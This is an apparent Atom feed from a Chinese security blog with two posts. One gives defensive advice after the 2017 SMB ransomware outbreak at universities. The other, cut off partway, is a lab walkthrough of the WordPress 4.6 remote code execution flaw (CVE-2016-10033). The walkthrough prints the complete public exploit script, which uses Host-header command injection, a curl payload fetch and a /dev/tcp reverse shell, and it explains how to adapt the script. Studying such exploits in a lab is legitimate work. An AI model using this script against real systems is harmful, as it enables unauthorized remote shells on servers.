<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Angoddess Blog</title>
  <subtitle>Security | Network | Develop</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-05-13T04:37:38.876Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Angoddess</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>17.2017年5月13日国内高校比特币勒索事件与防范应对措施</title>
    <link href="http://yoursite.com/2017%E5%B9%B45%E6%9C%8813%E6%97%A5%E5%9B%BD%E5%86%85%E9%AB%98%E6%A0%A1%E6%AF%94%E7%89%B9%E5%B8%81%E5%8B%92%E7%B4%A2%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%98%B2%E8%8C%83%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/"/>
    <id>http://yoursite.com/2017年5月13日国内高校比特币勒索事件与防范应对措施/</id>
    <published>2017-05-13T04:28:39.000Z</published>
    <updated>2017-05-13T04:37:38.876Z</updated>
    
    <content type="html">&lt;p&gt;　　445端口的蠕虫病毒一夜之间爆发，瞬间秒杀高校学生电脑，漏洞源于NSA泄露的windows漏洞攻击脚本，危害极大，把原本只在业内广泛流传和熟知的NSA泄露的win漏洞直接推向了大众。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;事件背景与分析&quot;&gt;&lt;a href=&quot;#事件背景与分析&quot; class=&quot;headerlink&quot; title=&quot;事件背景与分析&quot;&gt;&lt;/a&gt;事件背景与分析&lt;/h2&gt;&lt;p&gt;　　2017年4月，Shadow Brokers在网上放出了方程式组织的入侵工具，方程式组织隶属于美国安全局（NSA）。工具中包含大量针对windows系统的0day漏洞，其中ETERNALBLUE模块是通过SMB影响最新版本windows 2008 R2的RCE 0day漏洞，同时也影响大部分windows 7系统，其他模块攻击还涉及win 2003，win xp等版本系统，可造成直接被控制系统，危害极大。&lt;/p&gt;
&lt;p&gt;　　微软对此也发布了紧急更新，攻击模块对应补丁如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　此次国内多所高校学生电脑被感染的蠕虫病毒就是源于NSA公布的漏洞脚本中的windows 445端口的0day漏洞演变的，被攻击者电脑系统会被加密锁定进行比特币勒索，勒索软件加密手段采用了AES和RSA加密算法，解密难度相当高，爆破运算量十分庞大，没有密钥的情况下目前可以说基本无解。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;紧急防御方案&quot;&gt;&lt;a href=&quot;#紧急防御方案&quot; class=&quot;headerlink&quot; title=&quot;紧急防御方案&quot;&gt;&lt;/a&gt;紧急防御方案&lt;/h2&gt;&lt;p&gt;　　针对此次蠕虫病毒事件，建议大家妥善处理，小伙伴们做些安全措施再开机，尤其是使用windows 7系统的小伙伴。&lt;br&gt;　　以win 7为例，系统开机前，先断开网络，有线网络拔网线，无线网络先关闭路由器。之后启动电脑系统，进系统第一件事先开启系统防火墙。&lt;/p&gt;
&lt;p&gt;　　具体步骤如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　启动完防火墙之后，我们再修改防火墙入站规则，加强防御。&lt;/p&gt;
&lt;p&gt;　　打开防火墙高级设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　左侧选择入站规则，右侧选择新建规则&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　我们要防止445端口被漏洞利用进行蠕虫感染，所以规则类型选择端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-10.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　选择TCP协议，端口就是445端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-11.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　这里我们选择阻止连接，来阻断所有外部主动对本机445端口的连接请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-12.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　这里全部勾选，作用于所有网络环境当中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-13.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　最后这里的名称和描述可以随意填写，没有关系，然后完成&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-14.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　这就是我们新建的防火墙规则&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-15.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　做完这些，我们最后还需要对系统中的重要文件进行备份，拷贝到U盘或移动硬盘等外部存储介质当中，以防万一。&lt;/p&gt;
&lt;p&gt;　　最后，我们可以连接网络了，连接网络后，第一件事就是更新系统补丁。&lt;/p&gt;
&lt;p&gt;　　依然在控制面板的系统和安全选项中，选择Windows Update&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-16.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　我们选择检查更新进行补丁更新即可，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-17.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　更新完毕后，记得重启电脑&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/17/17-18.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;事件总结&quot;&gt;&lt;a href=&quot;#事件总结&quot; class=&quot;headerlink&quot; title=&quot;事件总结&quot;&gt;&lt;/a&gt;事件总结&lt;/h2&gt;&lt;p&gt;　　首先此次蠕虫感染事件主要受害群体是国内高校师生，为什么呢？&lt;/p&gt;
&lt;p&gt;　　1、国内高校大部分师生网络安全意识薄弱，电脑系统长期不更新&lt;/p&gt;
&lt;p&gt;　　2、国内高校大部分师生电脑操作系统均为windows 7，甚至为windows XP系统。&lt;/p&gt;
&lt;p&gt;　　3、国内高校大部分师生缺乏网络安全保护意识，随意浏览不明网站平台。&lt;/p&gt;
&lt;p&gt;　　4、高校师生基数大，且不少法律意识低，有的甚至钱多人傻，容易勒索成功。&lt;/p&gt;
&lt;p&gt;　　5、国内高校很多领导不重视校园安全，首先学校网站漏洞百出，容易被攻击，从而被不法分子进入学校内部网络，危害师生电脑安全。&lt;/p&gt;
&lt;p&gt;　　6、国内高校普遍不重视内网安全，众所周知，很多高校都有wifi，而且wifi密码也容易从各种途径获取，甚至直接没有密码，而很多高校都是接受访客的，也就给不法分子直接连接校园内部网络进行攻击提供方便，甚至不需进入校园，在校园附近的休闲场所即可连上校园wifi进行内网。&lt;/p&gt;
&lt;p&gt;　　从这次国内高校师生电脑感染蠕虫病毒的事件来看，我们不得不重视系统安全，提高个人网络安全意识，尤其是国内高校师生，甚至我觉得有必要把网络安全意识作为基础必修课程加入大学所有专业的必修课里。而且，高校领导也应该且必需重视网络安全，保护校园师生的电脑安全，且能够在安全的网络环境中工作学习，校方具有相当的责任。&lt;/p&gt;
&lt;p&gt;　　另外，从此次事件中，我们要警醒，NSA泄露的漏洞脚本已经有相当一段时间了，各种批量利用和演变的工具接下来会越来越多，我们要加强防范，尤其是&lt;strong&gt;机关单位，运营商，重点互联网企业&lt;/strong&gt;的办公系统和重要服务器，更是重中之重，必须做好对应的安全措施，加强防护。&lt;/p&gt;
&lt;p&gt;　　最后，NSA泄露的工具中，还涉及135，139，3389等端口的攻击，建议用不到这些端口的用户，在防火墙规则中自行屏蔽阻止连接，过程跟上面445一样，尤其是3389，在高校用的十分频繁，需谨慎。&lt;/p&gt;
&lt;p&gt;　　提高网络安全安全意识，保护个人隐私数据。&lt;/p&gt;
&lt;p&gt;　　PS：这里给大伙附上2017年6月1号即将执行的中华人民共和国网络安全法&lt;a href=&quot;http://www.miit.gov.cn/n1146295/n1146557/n1146614/c5345009/content.html&quot; title=&quot;中华人民共和国网络安全法&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.miit.gov.cn/n1146295/n1146557/n1146614/c5345009/content.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　445端口的蠕虫病毒一夜之间爆发，瞬间秒杀高校学生电脑，漏洞源于NSA泄露的windows漏洞攻击脚本，危害极大，把原本只在业内广泛流传和熟知的NSA泄露的win漏洞直接推向了大众。&lt;br&gt;
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="蠕虫" scheme="http://yoursite.com/tags/%E8%A0%95%E8%99%AB/"/>
    
      <category term="勒索" scheme="http://yoursite.com/tags/%E5%8B%92%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>16.WordPress4.6任意命令执行漏洞复现与Exp简单分析</title>
    <link href="http://yoursite.com/WordPress4-6%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8EExp%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/WordPress4-6任意命令执行漏洞复现与Exp简单分析/</id>
    <published>2017-05-09T11:59:04.000Z</published>
    <updated>2017-05-09T12:11:32.658Z</updated>
    
    <content type="html">&lt;p&gt;　　前阵子网上曝出了WordPress4.6的任意命令执行漏洞，而且还有poc和exp，不过貌似很多小伙伴复现失败了，这里就来分析分析吧！&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;　　这里简单说下漏洞形成的原因吧！其实，说到底算是老洞了，还记得去年的那个PHPMailer命令漏洞吗？漏洞编号：CVE-2016-10033！没错，就是它引发的这个WordPress4.6命令执行漏洞。我们利用WordPress中忘记密码功能，构造特殊的数据包，具体位置是header中的host参数，发送给服务器，host中的值被传递进了系统mail函数里面，最后触发了PHPMailer的命令执行漏洞。大体的形成原因就是酱紫的。&lt;/p&gt;
&lt;p&gt;　　具体漏洞代码就不分析了，网上已经有了，还挺清晰，&lt;a href=&quot;http://blog.nsfocus.net/wordpress-4-6-implementation-vulnerability-analysis/&quot; title=&quot;漏洞代码分析传送门&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.nsfocus.net/wordpress-4-6-implementation-vulnerability-analysis/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　好了，接下来是本文的重点了。&lt;/p&gt;
&lt;h2 id=&quot;靶机环境&quot;&gt;&lt;a href=&quot;#靶机环境&quot; class=&quot;headerlink&quot; title=&quot;靶机环境&quot;&gt;&lt;/a&gt;靶机环境&lt;/h2&gt;&lt;p&gt;　　首先是靶机环境问题，估计部分小伙伴复现不成功就是挂在靶机环境上了。&lt;/p&gt;
&lt;p&gt;　　我用的是linux服务器（利用exp本身也是针对linux靶机的），windows的服务器暂时还没测试就先不说。&lt;/p&gt;
&lt;p&gt;　　靶机环境如下：&lt;/p&gt;
&lt;p&gt;　　服务器：ubuntu server 14.04&lt;/p&gt;
&lt;p&gt;　　站点环境：apache 2.4.7、php 5.5.9、mysql 5.5&lt;/p&gt;
&lt;p&gt;　　IP地址：192.168.10.33&lt;/p&gt;
&lt;p&gt;　　怎么搭建php站点就不多说了，小伙伴们不明白的自己百度哈，在ubuntu上搭建还是很方便快捷的。然后下载wordpress4.6版本的源码，搭上去，具体步骤不懂的百度有，4.6版本传送门在这里&lt;a href=&quot;https://wordpress.org/wordpress-4.6.zip&quot; title=&quot;wordpress-4.6下载&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://wordpress.org/wordpress-4.6.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　wordpress安装成功后登陆界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　因为我们用的忘记密码功能涉及到发邮件，那么肯定要有邮件的服务啊&lt;br&gt;，我用的是exim4！这里说一下，没搭这个服务，估计是复现不了的。&lt;/p&gt;
&lt;p&gt;　　ubuntu安装exim非常简单&lt;/p&gt;
&lt;p&gt;　　&lt;code&gt;#apt-get install exim4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;　　然后我们再进行一下配置&lt;/p&gt;
&lt;p&gt;　　&lt;code&gt;#dpkg-reconfigure exim4-config&lt;/code&gt;　&lt;/p&gt;
&lt;p&gt;　　选择第一个，使用SMTP进行网络发送邮件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　这里输入系统邮件的名称，随意，我用了本机IP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　剩下的一路默认即可！freebuf上的文章说必须得exim4，我觉得不一定，只要能实现邮件服务器即可，验证成功与否直接通过搭好的wordpress忘记密码功能，执行一遍，没有出错就可以了！至此，我们的靶机环境就完成了！&lt;/p&gt;
&lt;p&gt;　　攻击机我用的kali，脚本直接扔进去即可，这里需要注意的是，脚本权限要高，不然会执行失败，我直接设置成777了。&lt;/p&gt;
&lt;p&gt;　　攻击机IP：192.168.10.55&lt;/p&gt;
&lt;h2 id=&quot;EXP分析与配置&quot;&gt;&lt;a href=&quot;#EXP分析与配置&quot; class=&quot;headerlink&quot; title=&quot;EXP分析与配置&quot;&gt;&lt;/a&gt;EXP分析与配置&lt;/h2&gt;&lt;p&gt;　　靶机搞定了，现在我们需要调整一下利用脚本了！&lt;/p&gt;
&lt;p&gt;　　原脚本源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
#
#   __      __   __  __     __
#  / /   ___  &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95; &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95; _/ /  / / / /___ &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/ /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;  &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;
# / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&amp;lt; /  __/ /  (__  )
#  /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/
#   /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/
#
#
# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
# CVE-2016-10033
#
# wordpress-rce-exploit.sh (ver. 1.0)
#
#
# Discovered and coded by
#
# Dawid Golunski (@dawid_golunski)
# https://legalhackers.com
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
#
# Exploit src URL:
# https://exploitbox.io/exploit/wordpress-rce-exploit.sh
#
#
# Tested on WordPress 4.6:
# https://github.com/WordPress/WordPress/archive/4.6.zip
#
# Usage:
# ./wordpress-rce-exploit.sh target-wordpress-url
#
#
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulns/exploitation?
#
#
#      .;lc&amp;apos;
#     .,cdkkOOOko;.
#     .,lxxkkkkOOOO000Ol&amp;apos;
#    .&amp;apos;:oxxxxxkkkkOOOO0000KK0x:&amp;apos;
#    .;ldxxxxxxxxkxl,.&amp;apos;lk0000KKKXXXKd;.
#    &amp;apos;:oxxxxxxxxxxo;.    .:oOKKKXXXNNNNOl.
#   &amp;apos;&amp;apos;;ldxxxxxdc,.     ,oOXXXNNNXd;,.
#  .ddc;,,:c;.   ,c:   .cxxc:;:ox:
#  .dxxxxo,  .,   ,kMMM0:.  .,  .lxxxxx:
#  .dxxxxxc  lW. oMMMMMMMK  d0  .xxxxxx:
#  .dxxxxxc  .0k.,KWMMMWNo :X:  .xxxxxx:
#  .dxxxxxc   .xN0xxxxxxxkXK,   .xxxxxx:
#  .dxxxxxc lddOMMMMWd0MMMMKddd.   .xxxxxx:
#  .dxxxxxc   .cNMMMN.oMMMMx&amp;apos;   .xxxxxx:
#  .dxxxxxc  lKo;dNMN.oMM0;:Ok. &amp;apos;xxxxxx:
#  .dxxxxxc ;Mc   .lx.:o, Kl &amp;apos;xxxxxx:
#  .dxxxxxdl;. .,      .. .;cdxxxxxx:
#  .dxxxxxxxxxdc,.     &amp;apos;cdkkxxxxxxxx:
#   .&amp;apos;:oxxxxxxxxxdl;.    .;lxkkkkkxxxxdc,.
#    .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#    .&amp;apos;:oxxxxxxxxx.ckkkkkkkkxl,.
#     .,cdxxxxx.ckkkkkxc.
#     .&amp;apos;:odx.ckxl,.
#      .,.&amp;apos;.
#
# https://ExploitBox.io
#
# https://twitter.com/Exploit_Box
#
# -----------------------------------------------------------------



rev_host=&amp;quot;192.168.10.33&amp;quot;

function prep_host_header() {  
   cmd=&amp;quot;$1&amp;quot;
   rce_cmd=&amp;quot;\${run{$cmd}}&amp;quot;;

   # replace / with ${substr{0}{1}{$spool_directory}}
   #sed &amp;apos;s^/^${substr{0}{1}{$spool_directory}}^g&amp;apos;
   rce_cmd=&amp;quot;`echo $rce_cmd | sed &amp;apos;s^/^\${substr{0}{1}{\$spool_directory}}^g&amp;apos;`&amp;quot;

   # replace &amp;apos; &amp;apos; (space) with
   #sed &amp;apos;s^ ^${substr{10}{1}{$tod_log}}$^g&amp;apos;
   rce_cmd=&amp;quot;`echo $rce_cmd | sed &amp;apos;s^ ^\${substr{10}{1}{\$tod_log}}^g&amp;apos;`&amp;quot;
   #return &amp;quot;target(any -froot@localhost -be $rce_cmd null)&amp;quot;
   host_header=&amp;quot;target(any -froot@localhost -be $rce_cmd null)&amp;quot;
   return 0
}


#cat exploitbox.ans
intro=&amp;quot;  
DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r  
bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f  
G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c  
G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg  
IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f  
IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f  
X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6  
b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb  
NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N  
TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1  
QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz  
NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g  
G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54  
eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb  
WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO  
TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg  
ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb  
MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD  
G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob  
WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz  
NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb  
MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f  
X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4  
bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&amp;quot;  
intro2=&amp;quot;  
ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09  
fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb  
MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg  
ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE  
aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09  
fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg  
ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh  
bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt  
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt  
ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp  
bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1  
cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&amp;quot;  
echo &amp;quot;$intro&amp;quot;  | base64 -d  
echo &amp;quot;$intro2&amp;quot; | base64 -d

if [ &amp;quot;$#&amp;quot; -ne 1 ]; then  
echo -e &amp;quot;Usage:\n$0 target-wordpress-url\n&amp;quot;  
exit 1  
fi  
target=&amp;quot;$1&amp;quot;  
echo -ne &amp;quot;\e[91m[*]\033[0m&amp;quot;  
read -p &amp;quot; Sure you want to get a shell on the target &amp;apos;$target&amp;apos; ? [y/N] &amp;quot; choice  
echo


if [ &amp;quot;$choice&amp;quot; == &amp;quot;y&amp;quot; ]; then

echo -e &amp;quot;\e[92m[*]\033[0m Guess I can&amp;apos;t argue with that... Let&amp;apos;s get started...\n&amp;quot;  
echo -e &amp;quot;\e[92m[+]\033[0m Connected to the target&amp;quot;

# Serve payload/bash script on :80
RCE_exec_cmd=&amp;quot;(sleep 3s &amp;amp;&amp;amp; nohup bash -i &amp;gt;/dev/tcp/$rev_host/1337 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1) &amp;amp;&amp;quot;  
echo &amp;quot;$RCE_exec_cmd&amp;quot; &amp;gt; rce.txt  
python -mSimpleHTTPServer 80 2&amp;gt;/dev/null &amp;gt;&amp;amp;2 &amp;amp;  
hpid=$!

# Save payload on the target in /tmp/rce
cmd=&amp;quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&amp;quot;  
prep_host_header &amp;quot;$cmd&amp;quot;  
curl -H&amp;quot;Host: $host_header&amp;quot; -s -d &amp;apos;user_login=admin&amp;amp;wp-submit=Get+New+Password&amp;apos; $target/wp-login.php?action=lostpassword  
echo -e &amp;quot;\n\e[92m[+]\e[0m Payload sent successfully&amp;quot;

# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
cmd=&amp;quot;/bin/bash /tmp/rce&amp;quot;  
prep_host_header &amp;quot;$cmd&amp;quot;  
curl -H&amp;quot;Host: $host_header&amp;quot; -d &amp;apos;user_login=admin&amp;amp;wp-submit=Get+New+Password&amp;apos; $target/wp-login.php?action=lostpassword &amp;amp;  
echo -e &amp;quot;\n\e[92m[+]\033[0m Payload executed!&amp;quot;

echo -e &amp;quot;\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n&amp;quot;  
nc -vv -l 1337  
echo  
else  
echo -e &amp;quot;\e[92m[+]\033[0m Responsible choice ;)
  Exiting.\n&amp;quot;  
exit 0

fi


echo &amp;quot;Exiting...&amp;quot;  
exit 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　先说说脚本整体预期达到的效果，是想通过该命令执行漏洞，往目标服务器的/tmp/中写入一个rce文件，然后执行rce文件中的命令连接我们攻击机上正在监听的nc程序，从而获得目标服务器的反弹shell。&lt;/p&gt;
&lt;p&gt;　　整个脚本，前面注释部分不看，都是作者和漏洞本身一些信息，下面首先需要修改的就是变量&lt;code&gt;rev_host&lt;/code&gt;，这个是我们攻击机的IP，后面会用于目标服务器反弹shell时，请求连接的地址。源码158行可以看到反弹shell命令，变量&lt;code&gt;rev_host&lt;/code&gt;的值被传进命令中，下一行就是把命令写入本地rce.txt中，而164行可以看到，反弹shell命令被写入靶机服务器/tmp/目录中的rce文件中。&lt;/p&gt;
&lt;p&gt;　　这里根据我的环境，设置成了&lt;code&gt;192.168.10.55&lt;/code&gt;，改完&lt;code&gt;rev_host&lt;/code&gt;之后，我们需要注意的就是166行和172行当中的&lt;code&gt;user_login&lt;/code&gt;的值，这里必须是跟你安装wordpress的时候，设置的管理员一致的用户名或邮箱地址，这里默认是admin，当然，如果是实际生产环境中的wordpress，任意一个用户名或邮箱地址也可以，但必须是正确的，不然根本触发不了漏洞，更别提命令执行了。&lt;/p&gt;
&lt;p&gt;　　我安装wordpress就是用的admin做管理员用户名，那么我这里就不用改变，还是用&lt;code&gt;user_login=admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;　　现在我们可以尝试进行攻击了，这里需要注意的是，如果端口被占用了，我们就要换个端口，源码158行和176行中的1337改掉，换成其他端口即可，如替换成58888。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　另外看176行源码，我们会发现，nc命令中1337前面少了个参数-p，这也是我们执行失败的原因之一，不加-p的执行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
